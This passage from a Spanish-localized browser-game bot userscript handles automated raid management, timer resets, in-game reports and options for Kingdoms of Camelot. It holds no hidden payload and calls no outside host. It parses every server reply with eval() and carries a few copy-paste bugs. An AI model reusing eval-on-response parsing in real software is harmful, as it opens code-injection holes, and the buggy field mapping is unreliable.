  	  	params.queue[0].cityMarches.unit5Count = parseInt(document.getElementById ('Unit5').value);
  	  	params.queue[0].cityMarches.unit6Count = parseInt(document.getElementById ('Unit6').value);
  	  	params.queue[0].cityMarches.unit7Count = parseInt(document.getElementById ('Unit7').value);
  	  	params.queue[0].cityMarches.unit8Count = parseInt(document.getElementById ('Unit8').value);
  	  	params.queue[0].cityMarches.unit9Count = parseInt(document.getElementById ('Unit9').value);
  	  	params.queue[0].cityMarches.unit10Count = parseInt(document.getElementById ('Unit10').value);
  	  	params.queue[0].cityMarches.unit11Count = parseInt(document.getElementById ('Unit11').value);
  	  	params.queue[0].cityMarches.unit12Count = parseInt(document.getElementById ('Unit12').value);
  	  	params.queue[0].cityMarches.marchId =  t.rslt['queue'][y]['botMarches']['marchId'];

  		new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
				 loading: true,
				 onSuccess: function(transport){
					var rslt = eval("(" + transport.responseText + ")");
                        if (rslt.ok) {
							pop.show (false);
							unsafeWindow.cityinfo_army();
                            setTimeout(unsafeWindow.update_seed_ajax, 250);
							setTimeout(t.GetRaids, (750),Seed.cities[i][0]);
						}
				 },
  		 });
  }, false);

  	  pop.show (true);
  },

   DeleteRaid : function (Id){
	  var t = Tabs.Raid;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

  	for (y in t.rslt['queue']) {
  		if (t.rslt['queue'][y]['botMarches'] != undefined) {
	  		if (t.rslt['queue'][y]['botMarches']['marchId'] == Id) {
	  				marchId = t.rslt['queue'][y]['botMarches']['marchId'];
	  				cityId = t.rslt['queue'][y]['botMarches']['cityId'];
	  				knightId = t.rslt['queue'][y]['botMarches']['knightId'];
	  				toTileLevel = t.rslt['queue'][y]['botMarches']['toTileLevel'];
	  				returnUnixTime = t.rslt['queue'][y]['botMarches']['returnUnixTime'];
	  				destinationUnixTime = t.rslt['queue'][y]['botMarches']['destinationUnixTime'];
	  				toXCoord = t.rslt['queue'][y]['botMarches']['toXCoord'];
	  				toYCoord = t.rslt['queue'][y]['botMarches']['toYCoord'];
	  				var units = {};
	  				for (i=1;i<13;i++) units[i] = t.rslt['queue'][y]['botMarches']['unit'+i+'Count'];
	  		}
		}
    }

  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'deleteMarch';
  	params.marchId = marchId;
  	params.settings = {};
  	params.settings.cityId = cityId;

    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  	         method: "post",
  	         parameters: params,
  			 loading: true,
  			 onSuccess: function(transport){
  				var rslt = eval("(" + transport.responseText + ")");
  	              if (rslt.ok) {
  	              	  var serverID = getServerId();
  	              	  t.save = GM_getValue ('SavedRaids_'+serverID);
  	              	  if (t.save == undefined) t.save =new Array();
					  else t.save = JSON2.parse (t.save);

  	              	  t.save.push ({
  	              	  	marchId:		marchId,
  	              	  	cityId:   		cityId,
  	              	  	knightId:		knightId,
  	              	  	toTileLevel:	toTileLevel,
  	              	  	returnUnixTime:	destinationUnixTime,
  	              	  	returnUnixTime:	returnUnixTime,
  	              	  	toXCoord:		toXCoord,
  	              	  	toYCoord:		toYCoord,
  	              	  	unit1Count: 	units[1],
  	              	  	unit2Count: 	units[2],
  	              	  	unit3Count: 	units[3],
  	              	  	unit4Count: 	units[4],
  	              	  	unit5Count: 	units[5],
  	              	  	unit6Count: 	units[6],
  	              	  	unit7Count: 	units[7],
  	              	  	unit8Count: 	units[8],
  	              	  	unit9Count: 	units[9],
  	              	  	unit10Count: 	units[10],
  	              	  	unit11Count: 	units[11],
  	              	  	unit12Count: 	units[12],
  	              	  });
  	              	  var troops = Seed.units["city" + cityId];
                      for (var u = 1; u <= 12; ++u) {
                          var troop_number = parseInt(rslt["unit" + u + "Return"]);
                          if (isNaN(troop_number)) {
                              troop_number = parseInt(Seed.units["city" + cityId]["unt" + u]);
                          } else troop_number = parseInt(rslt["unit" + u + "Return"]) + parseInt(Seed.units["city" + cityId]["unt" + u]);
                          troops["unt" + u] = troop_number;
                      }
                      for (u in Seed.queue_atkp['city' + cityId]){
                      	if (Seed.queue_atkp['city' + cityId][u]['marchId'] == marchId){
							Seed.queue_atkp['city' + cityId][u] = "";
                      		unsafeWindow.seed.queue_atkp['city' + cityId] = Seed.queue_atkp['city' + cityId];
                      	}
                      }

                      for (u in Seed.knights['city' + cityId]){
                      	if (Seed.knights['city' + cityId][u]['knightId'] == knightId){
                      		Seed.knights['city' + cityId][u]["knightStatus"] = 1;
                      		unsafeWindow.seed.knights['city' + cityId] = Seed.knights['city' + cityId];
                      	}
                      }

  	              	  GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));
  	              	  t.save = null;
                      unsafeWindow.cityinfo_army();
  	                  setTimeout(unsafeWindow.update_seed_ajax, 250);
  	                  t.GetRaids(cityId);
  					}
  			 },
  	 });
  },

  StopCityRaids : function (cityId){
    	var t = Tabs.Raid;
    	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);


    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'stopAll';
    	params.settings = {};

  	    params.settings.cityId = cityId;

    	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    		  		method: "post",
    		         parameters: params,
    				 loading: true,
    				 onSuccess: function(transport){
    					var rslt = eval("(" + transport.responseText + ")");
    	                  if (rslt.ok) {

    					  }
    				 },
    		 });
    setTimeout(t.GetRaids, (750), cityId);
    },

  StopAllRaids : function (){
      	var t = Tabs.Raid;
      	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
      	if (t.activecount == 0) return;
	    t.stopping = true;
	      	for (i=0;i<Seed.cities.length;i++){
		      	setTimeout(t.DoAllStop, (i*1500),i);
		     }
   },

   ResumeAllRaids : function (){
       	var t = Tabs.Raid;
       	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
       	if (t.stopcount == 0) return;
       	t.resuming = true;
   			for (i=0;i<Seed.cities.length;i++){
   			    setTimeout(t.DoAllResume, (i*1500),i);
   			}
    },


   DeleteAllRaids : function (){
       	var t = Tabs.Raid;
       	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
       	if (t.stopcount == 0) return;
       	t.deleting = true;
       	count=0;
       	t.count = t.stopcount;
				for (d=0; d< Seed.cities.length;d++) {
						cityID = 'city' + Seed.cities[d][0];
							for (e in Seed.queue_atkp[cityID]){
								destinationUnixTime = Seed.queue_atkp[cityID][e]['destinationUnixTime'];
								MarchStatus = Seed.queue_atkp[cityID][e]['marchStatus'];
								MarchType = Seed.queue_atkp[cityID][e]['marchType'];
								if (MarchType == 9 && (botMarchStatus == 3 || MarchStatus == 3)) {
									count++;
									setTimeout(t.DoAllDelete, (count*1250), (Seed.queue_atkp[cityID][e]['marchId']),d,count);
				}
			 }
		}
   },


  DoAllStop: function(i) {
    var t = Tabs.Raid;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'stopAll';
  	params.settings = {};
  	params.settings.cityId = Seed.cities[i][0];

  		 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  			  		method: "post",
  			         parameters: params,
  					 loading: true,
  					 onSuccess: function(transport){
  						var rslt = eval("(" + transport.responseText + ")");
  		                  if (rslt.ok) {
  		                  		t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  		                  		actionLog('Parando: '+ Seed.cities[i][1]);
  		                  		updatebotbutton('Parando: '+ t.stopprogress.toFixed(0) + '%', 'pbraidtab');
								if (t.stopprogress.toFixed(0) == 100) {
  		                  			t.stopprogress = 0;
  		                  			setTimeout(function(){updatebotbutton(' ('+ t.activecount + ')Raid Parados', 'pbraidtab');t.stopping = false;}, (5000));
								}
  						  }
  						  else {
  						  		if (rslt.msg == "El sistema está ocupado, por favor intente más tarde") setTimeout (t.DoAllStop, (2000),i);
  						  		else {
  					 	  			t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  					 	  			actionLog('Parando: '+ Seed.cities[i][1] + ' - ' + rslt.msg);
  					 	  			updatebotbutton('Parando: '+ t.stopprogress.toFixed(0) + '%', 'pbraidtab')
									if (t.stopprogress.toFixed(0) == 100) {
  					 	  				 t.stopprogress = 0;
										 setTimeout(function(){updatebotbutton(' ('+ t.activecount + ') Raid Parado', 'pbraidtab');t.stopping = false;}, (5000));
									}
								}
						  }
					},
		 });
   },

  DoAllResume: function(i) {
    var t = Tabs.Raid;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'resumeAll';
  	params.settings = {};
    params.settings.cityId = Seed.cities[i][0];

  		 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  			  		method: "post",
  			         parameters: params,
  					 loading: true,
  					 onSuccess: function(transport){
  						var rslt = eval("(" + transport.responseText + ")");
  		                  if (rslt.ok) {
  		                  		t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  		                  		actionLog('Reanudando: '+ Seed.cities[i][1]);
								updatebotbutton('Reanudando: '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabRes');
  		                  		if (t.stopprogress.toFixed(0) == 100) {
  		                  			 t.stopprogress = 0;
	    							setTimeout(function(){updatebotbutton('Reanudar ('+ t.stopcount + ') redadas', 'pbraidtabRes');t.resuming = false;}, (5000));
				}
		}
  						  else {
  						  		if (rslt.msg == "El sistema está ocupado, por favor intente más tarde") setTimeout (t.DoAllResume, (2000),i);
  						  		else {
  					 	  			t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  					 	  			actionLog('Parando: '+ Seed.cities[i][1]  + ' - ' + rslt.msg);
  					 	  			updatebotbutton('Reanudando: '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabRes')
  					 	  			if (t.stopprogress.toFixed(0) == 100) {
  					 	  				 t.stopprogress = 0;
  					 	  				 setTimeout(function(){updatebotbutton('Reanudar ('+ t.stopcount + ') redadas', 'pbraidtabRes');t.resuming = false;}, (5000));
  					 	  			}
								}
						  }
  					 },
		 });
  },

  DoAllDelete : function (Id,city,count){
		var t = Tabs.Raid;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

		cityID = 'city'+ Seed.cities[city][0];

    	for (f in Seed.queue_atkp[cityID]){
    		if (Seed.queue_atkp[cityID][f]['marchId'] == Id) {
    				marchId = Seed.queue_atkp[cityID][f]['marchId'];
    				cityId = Seed.queue_atkp[cityID][f]['cityId'];
    				knightId = Seed.queue_atkp[cityID][f]['knightId'];
    				toTileLevel = Seed.queue_atkp[cityID][f]['toTileLevel'];
    				returnUnixTime = Seed.queue_atkp[cityID][f]['returnUnixTime'];
    				destinationUnixTime = Seed.queue_atkp[cityID][f]['destinationUnixTime'];
    				toXCoord = Seed.queue_atkp[cityID][f]['toXCoord'];
    				toYCoord = Seed.queue_atkp[cityID][f]['toYCoord'];
    				var units = {};
    				for (i=1;i<13;i++) units[i] = Seed.queue_atkp[cityID][f]['unit'+i+'Count'];
  			}
      }

    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'deleteMarch';
    	params.marchId = marchId;
    	params.settings = {};
    	params.settings.cityId = cityId;

      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    	         method: "post",
    	         parameters: params,
    			 loading: true,
    			 onSuccess: function(transport){
    				var rslt = eval("(" + transport.responseText + ")");
    	              if (rslt != "") {
    	              	  var serverID = getServerId();
    	              	  t.save = GM_getValue ('SavedRaids_'+serverID, "[]");
    	              	  if (t.save != undefined) t.save = JSON2.parse (t.save);
    	              	  if (t.save == undefined) t.save =new Array();

    	              	  t.save.push ({
    	              	  	marchId:		marchId,
    	              	  	cityId:   		cityId,
    	              	  	knightId:		knightId,
    	              	  	toTileLevel:	toTileLevel,
    	              	  	returnUnixTime:	destinationUnixTime,
    	              	  	returnUnixTime:	returnUnixTime,
    	              	  	toXCoord:		toXCoord,
    	              	  	toYCoord:		toYCoord,
    	              	  	unit1Count: 	units[1],
    	              	  	unit2Count: 	units[2],
    	              	  	unit3Count: 	units[3],
    	              	  	unit4Count: 	units[4],
    	              	  	unit5Count: 	units[5],
    	              	  	unit6Count: 	units[6],
    	              	  	unit7Count: 	units[7],
    	              	  	unit8Count: 	units[8],
    	              	  	unit9Count: 	units[9],
    	              	  	unit10Count: 	units[10],
    	              	  	unit11Count: 	units[11],
    	              	  	unit12Count: 	units[12],
    	              	  });

    	              	  var troops = Seed.units["city" + cityId];
    	              	  for (var u = 1; u <= 12; ++u) {
    	              	      var troop_number = parseInt(rslt["unit" + u + "Return"]);
    	              	      if (isNaN(troop_number)) {
    	              	          troop_number = parseInt(Seed.units["city" + cityId]["unt" + u]);
    	              	      } else troop_number = parseInt(rslt["unit" + u + "Return"]) + parseInt(Seed.units["city" + cityId]["unt" + u]);
    	              	      troops["unt" + u] = troop_number;
    	              	  }

    	              	  setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
                          unsafeWindow.cityinfo_army();
    	                  setTimeout(unsafeWindow.update_seed_ajax, 250);
    					}
    			 },
    	 });
  		  	 t.stopprogress = count * (100/t.count);
  		  	 actionLog('Borrando: '+ Seed.cities[city][1]);
  		  	 updatebotbutton('Borrando: '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabDel');
  		  	 if (t.stopprogress.toFixed(0) == 100) {
  		  	 	 t.stopprogress = 0;
  		  	 	 t.GetRaids(cityId);
  		  	 	 setTimeout(function(){updatebotbutton('Borrando ('+ t.stopcount + ') Raid', 'pbraidtabDel');t.deleting  = false;}, (5000));
  	}

},


  DeleteCityRaids : function (){
      	var t = Tabs.Raid;
      	alert('Este boton necesita ser agregado...');
      	/*var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);


      	params.pf = 0;
      	params.ctrl = 'BotManager';
      	params.action = 'stopAll';
      	params.settings = {};

    	    params.settings.cityId = t.cityId;

      	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
      		  		method: "post",
      		         parameters: params,
      				 loading: true,
      				 onSuccess: function(transport){
      					var rslt = eval("(" + transport.responseText + ")");
      	                  if (rslt.ok) {

      					  }
      				 },
      		 }); */
      },


  AddRaid : function (Id){
    	var t = Tabs.Raid;
    	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    	update = {};

    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'saveMarch';
    	params.settings = {};
    	params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};

    	for (y in t.save){
    		if (t.save[y]['marchId'] == Id){
	    		params.settings.cityId = t.save[y]['cityId'];
	    		params.queue[0].cityMarches.knightId = t.save[y]['knightId']; //parseInt(document.getElementById('AddKnights').value);
	    		params.queue[0].cityMarches.toXCoord = t.save[y]['toXCoord'];
	    		params.queue[0].cityMarches.toYCoord = t.save[y]['toYCoord'];
	    		params.queue[0].cityMarches.unit0Count = 0;
	    		params.queue[0].cityMarches.unit1Count = t.save[y]['unit1Count'];
	    		params.queue[0].cityMarches.unit2Count = t.save[y]['unit2Count'];
	    		params.queue[0].cityMarches.unit3Count = t.save[y]['unit3Count'];
	    		params.queue[0].cityMarches.unit4Count = t.save[y]['unit4Count'];
	    		params.queue[0].cityMarches.unit5Count = t.save[y]['unit5Count'];
	    		params.queue[0].cityMarches.unit6Count = t.save[y]['unit6Count'];
	    		params.queue[0].cityMarches.unit7Count = t.save[y]['unit7Count'];
	    		params.queue[0].cityMarches.unit8Count = t.save[y]['unit8Count'];
	    		params.queue[0].cityMarches.unit9Count = t.save[y]['unit9Count'];
	    		params.queue[0].cityMarches.unit10Count = t.save[y]['unit10Count'];
	    		params.queue[0].cityMarches.unit11Count = t.save[y]['unit12Count'];
	    		params.queue[0].cityMarches.unit12Count = t.save[y]['unit12Count'];
 			}
 			}

    	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    		  		method: "post",
    		         parameters: params,
    				 loading: true,
    				 onSuccess: function(transport){
    					var rslt = eval("(" + transport.responseText + ")");
    	                  if (rslt.ok) {
								t.GetRaids(params.settings.cityId);
      					        unsafeWindow.cityinfo_army();
      	                  		setTimeout(unsafeWindow.update_seed_ajax, 250);
      	                  		for (yy=0;yy<t.save.length;yy++){
      	                  			if (t.save[yy]['marchId'] == Id){
      	                  				  t.save.splice (yy,1);
			}
		}
      	                  		var serverID = getServerId();
      	                  		setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
      	                  		t.paint();
 		} else {
    					 	 /* var pop = new CPopup ('pbEditRaid', 0,0, 750,250, true);
				 		  	  if (t.popFirst){
				 		  	    pop.centerMe (mainPop.getMainDiv());
				 		  	    t.popFirst = false;
				 		  	  }
				 		  	  pop.getTopDiv().innerHTML = '<CENTER><B>ERROR</b></center>';
				 		  	  var m= '<TABLE id=pbRaidAdd width=100% height=0% class=pbTab><TR align="center">';
				 			  m +=  '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/merlin_img.jpg"></td>';
				 			  m+='<TD style="align;left; max-width:200px; text-wrap:normal;word-wrap:break-word"><B>'+ rslt.msg+'</b></td>';
				 		  	  m+='<TD><CENTER>'+ strButton20('OK', 'id=pbOK') +'</center></td></tr>';
				 		  	  pop.getMainDiv().innerHTML = m;
				 			  document.getElementById('pbOK').addEventListener ('click', function(){pop.show (false)},false);
				 		  	  pop.show (true);*/
				 		  	  alert('Error: '+ rslt.msg);
 		}
 		},
 	});
   },


  getKnights : function(cityId){
         var t = Tabs.Raid;
         var knt = new Array();
         var status ="";
         for (k in Seed.knights['city' + cityId]){
         		if ( Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
         		   if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 ) status = "Free";
         		   else status = "Marching";
         			knt.push ({
         				Name:   Seed.knights['city' + cityId][k]["knightName"],
         				Combat:	parseInt(Seed.knights['city' + cityId][k]["combat"]),
         				ID:		Seed.knights['city' + cityId][k]["knightId"],
         				Status: status,
         			});
         		}
         }
         knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
         document.getElementById('AddKnights').options.length=0;
  		var o = document.createElement("option");
  		o.text = '--Choose a Knight--';
  		o.value = 0;
  		document.getElementById("AddKnights").options.add(o);
         for (k in knt){
      			if (knt[k]["Name"] !=undefined){
  	    			var o = document.createElement("option");
  	    			o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +') (' + knt[k]["Status"] +')');
  	    			o.value = knt[k]["ID"];
  	    			document.getElementById("AddKnights").options.add(o);
      			}
      	}
      },


  clickCitySelect : function (city){
  	var t = Tabs.Raid;
  	t.cityId = city['id'];
  	t.GetRaids(t.cityId);
  },

  checkRaids : function (){
	var t = Tabs.Raid;
	var now = unixTime();
	if(!Options.RaidRunning) return;
	if ( (now - Options.RaidReset) > 7200 ) {
		Options.RaidReset = now;
		saveOptions();
		for (g=0;g<Seed.cities.length;g++){
				t.citiesdone = "";
				setTimeout(t.resetRaids, (1500*g), Seed.cities[g][0],Seed.cities[g][1]);
		}
		setTimeout(t.postLog, 30000);
	}
	t.raidtimer = setTimeout(t.checkRaids, 900000);
  },

  GetRaids : function(cityId){
  		var t = Tabs.Raid;
  		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

  		params.pf = 0;
  		params.ctrl = 'BotManager';
  		params.action = 'getMarches';
  		params.settings = {};
  		params.settings.cityId = cityId;


   		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  				 loading: true,
  				 onSuccess: function(transport){
  					var rslt = eval("(" + transport.responseText + ")");
                        if (rslt.ok) {
                        	t.rslt = rslt;
  							t.paint();
  							unsafeWindow.cityinfo_army();
  							setTimeout(unsafeWindow.update_seed_ajax, 250);
  						}
  				 },
  		 });
  },


  resetRaids : function(cityId,cityName){
  		var t = Tabs.Raid;
  		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

  		params.pf = 0;
  		params.ctrl = 'BotManager';
  		params.action = 'resetRaidTimer';
		params.settings = {};
  		params.settings.cityId = cityId;


   		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
				 loading: true,
				 onSuccess: function(transport){
					var rslt = eval("(" + transport.responseText + ")");
                        if (rslt.ok) {
							unsafeWindow.cityinfo_army();
                            setTimeout(unsafeWindow.update_seed_ajax, 250);
                            t.citiesdone += cityName + ' ';
						}
				 },
  		 });
  },

  postLog : function (){
  		var t = Tabs.Raid;
  		actionLog('Reset Raidtimer: ' + t.citiesdone);
  },

   sendreport: function(){
	  var t = Tabs.Raid;
	  if(!Options.foodreport) return;
	  var now = new Date().getTime()/1000.0;
      now = now.toFixed(0);
      if (now < (parseInt(Options.LastReport)+(Options.MsgInterval*60*60))) return;

	var total = 0;
    var message = 'Raid Stats: %0A';
    message += '%0A Alimento Ganado (durante '+ Options.MsgInterval +' horas de redadas) %0A';
    for (q=1;q<=Seed.cities.length;q++){
    	var cityID = 'city' + Seed.cities[q-1][0];
    	var gain = parseInt(Seed.resources[cityID]['rec1'][0] / 3600) - Options.Foodstatus[q];
    	message+= Seed.cities[q-1][1] + ': Inicio: ' + addCommas(Options.Foodstatus[q]) + ' Fin :' + addCommas(parseInt(Seed.resources[cityID]['rec1'][0] / 3600)) + ' Ganancia: ';    	message+= Seed.cities[q-1][1] + ': Inicio: ' + addCommas(Options.Foodstatus[q]) + ' Fin :' + addCommas(parseInt(Seed.resources[cityID]['rec1'][0] / 3600)) + ' Ganancia: ';
    	message += addCommas(gain)  + '%0A';
		total += gain;
		Options.Foodstatus[q] = parseInt(Seed.resources[cityID]['rec1'][0] / 3600);
    }
	message += '%0A Alimento total ganado : '+addCommas(total)+'%0A';

    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.emailTo = Seed.player['name'];
    params.subject = "Informe de Raid General";
    params.message = message;
    params.requestType = "COMPOSED_MAIL";
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (message) {
            var rslt = eval("(" + message.responseText + ")");
            if (rslt.ok) {
            } else {
            }
        },
        onFailure: function () {
        },
    });

	Options.LastReport = now;
    saveOptions();
  },

  toggleRaidState : function (){
  	var t = Tabs.Raid;
  	if(Options.RaidRunning){
  		Options.RaidRunning = false;
  		t.raidtimer = null;
  		document.getElementById('pbRaidStart').value = 'Auto Reset = OFF';
  	} else {
  		Options.RaidRunning = true;
  		t.raidtimer = setTimeout(t.checkRaids, 5000);
  		document.getElementById('pbRaidStart').value = 'Auto Reset = ON';
  	}
	saveOptions();
  },


  hide : function (){
  },

  show : function (){
  },
};


/*********************************** Log Tab ***********************************/
Tabs.ActionLog = {
  tabOrder: 11,
  tabLabel : 'Log',
  myDiv : null,
  logTab : null,
  maxEntries: 300,
  last50 : [],
  state : null,

  init : function (div){
    var t = Tabs.ActionLog;
    t.myDiv = div;
    t.myDiv.innerHTML = '<DIV class=pbStat>REGISTRO DE ACCIONES - VERSIÓN: '+ Version+'</div><DIV style="height:535px; max-height:535px; overflow-y:auto">\
      <TABLE cellpadding=0 cellspacing=0 id=pbactionlog class=pbTabLined><TR><TD></td><TD width=95%></td></table></div>';
    t.logTab = document.getElementById('pbactionlog');
    t.state = 1;
    var a = JSON2.parse(GM_getValue ('log_'+getServerId(), '[]'));
    if (matTypeof(a) == 'array'){
      t.last50 = a;
      for (var i=0; i<t.last50.length; i++)
        t._addTab (t.last50[i].msg, t.last50[i].ts);
    }
    window.addEventListener('unload', t.onUnload, false);
  },

  hide : function (){
  },

  show : function (){
  },

  onUnload : function (){
    var t = Tabs.ActionLog;
    if (!ResetAll) GM_setValue ('log_'+getServerId(), JSON2.stringify(t.last50));
  },

  _addTab : function (msg, ts){
    var t = Tabs.ActionLog;
    if (t.state != 1)
      return;
    if (t.logTab.rows.length >= t.maxEntries)
      t.logTab.deleteRow(t.maxEntries-1);
    var row = t.logTab.insertRow(0);
    row.vAlign = 'top';
    row.insertCell(0).innerHTML = ts;
    row.insertCell(1).innerHTML = msg;
  },

  log : function (msg){
    var t = Tabs.ActionLog;
    var ts = new Date().toTimeString().substring (0,8);
    t._addTab (msg, ts);
	while (t.last50.length >= 50)
      t.last50.shift();
    t.last50.push ({msg:msg, ts:ts});
  },
}

function actionLog (msg){
  if (!Tabs.ActionLog.tabDisabled)
    Tabs.ActionLog.log (msg);
}


/*********************************** Options Tab ***********************************/
Tabs.Options = {
  tabOrder: 10,
  tabLabel : 'Opciones',
  myDiv : null,
  fixAvailable : {},

  init : function (div){
    var t = Tabs.Options;
    t.myDiv = div;
    try {
      m = '<DIV style="height:500px; max-height:500px; overflow-y:auto"><TABLE width=100% class=pbOptions cellspacing=0 cellpadding=0>\
        <TR><TD colspan=2><B> Configuración de Power Bot:</b></td></tr>\
        <TR><TD><INPUT id=pballowWinMove type=checkbox /></td><TD>Habilitar el arrastre de la ventana (mover la ventana arrastrando la barra superior con el ratón)</td></tr>\
        <TR><TD><INPUT id=pbTrackWinOpen type=checkbox /></td><TD>Recordar la ventana abierta al recargar</td></tr>\
        <TR><TD><INPUT id=pbHideOnGoto type=checkbox /></td><TD>Ocultar ventana al hacer clic en las coordenadas del mapa</td></tr>\
		<TR><TD><INPUT id=pbWideOpt type=checkbox '+ (GlobalOptions.pbWideScreen?'CHECKED ':'') +'/></td><TD>Activar estilo pantalla ancha: '+ htmlSelector({normal:'Normal', wide:'Pantalla ancha', ultra:'Ultra'},GlobalOptions.pbWideScreenStyle,'id=selectScreenMode') +' (todos los dominios, requiere refrescar)</td></tr>\
		<TR><TD colspan=2><BR><B>Características de KofC:</b></td></tr>\
        <TR><TD><INPUT id=pbFairie type=checkbox /></td><TD>Deshabilitar todas las ventanas emergentes de Fairie</td></tr>\
        <TR><TD><INPUT id=pbWatchEnable type=checkbox '+ (GlobalOptions.pbWatchdog?'CHECKED ':'') +'/></td><TD>Actualizar si KOC no se carga en 1 minuto (todos los dominios)</td></tr>\
        <TR><TD><INPUT id=pbEveryEnable type=checkbox /></td><TD>Actualizar todos los KOC en <INPUT id=pbeverymins type=text size=2 maxlength=3 \> minutos</td></tr>\
        <TR><TD><INPUT id=pbChatREnable type=checkbox /></td><TD>Poner chat a la derecha (se requiere pantalla ancha)</td></tr>\
		<TR><TD><INPUT id=pbWMapEnable type=checkbox /></td><TD>Usar mapa ancho (requiere pantalla ancha)</td></tr>\
        <TR><TD><INPUT id=pbGoldEnable type=checkbox /></td><TD>Auto recoger el oro cuando la felicidad llega <INPUT id=pbgoldLimit type=text size=2 maxlength=3 \>%</td></tr>\
        <TR><TD><INPUT id=pbFoodToggle type=checkbox /></td><TD>Activar Alerta de Alimento (En menos de 4 horas de comida comprobarse cada hora)</td></tr>\
        <TR><TD colspan=2><BR><B>Características adicionales:</b></td></tr>\
        <TR><TD><INPUT id=HelReq type=checkbox /></td><TD>Editar pedir Ayuda en construcciones/investigaciones a la alianza</td></tr>\
        <TR><TD><INPUT id=DelReq type=checkbox /></td><TD>Ocultar peticiones de ayuda en el chat de alianza</td></tr>\
        <TR><TD><INPUT id=PubReq type=checkbox '+ (GlobalOptions.autoPublishGamePopups?'CHECKED ':'') +'/></td><TD>Auto publicar los mensajes de Facebook para '+ htmlSelector({0:'----', 80:'Todos', 50:'Amigos de Amigos', 40:'Solo Amigos', 10:'Solo a mi'},GlobalOptions.autoPublishPrivacySetting,'id=selectprivacymode') +' (Todos los dominios)</td>\
		<TR><TD><INPUT id=MapExtra type=checkbox /></td><TD>Mostrar jugador y podrío en el mapa.</td></tr>\
		</table><BR><BR><HR>Si una casilla es de color gris, probablemente ha habido cambios en el código de KofC, lo que hace la opción inoperables.</div>\
		</table><BR><BR><HR>Tenga en cuenta que si una casilla es de color gris probablemente ha habido un cambio de código KofC \'s, lo que hace la opción inoperable.</div>';
        m += strButton20('Resetear TODAS las Opciones', 'id=ResetALL');
	  div.innerHTML = m;

      document.getElementById('selectScreenMode').addEventListener ('change', function(){
      		GlobalOptions.pbWideScreenStyle = document.getElementById('selectScreenMode').value;
      		GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);
      document.getElementById('selectprivacymode').addEventListener ('change', function(){
      		GlobalOptions.autoPublishPrivacySetting = document.getElementById('selectprivacymode').value;
			GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);
	  document.getElementById('PubReq').addEventListener ('change', function(){
      		GlobalOptions.autoPublishGamePopups = document.getElementById('PubReq').checked;
			GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);

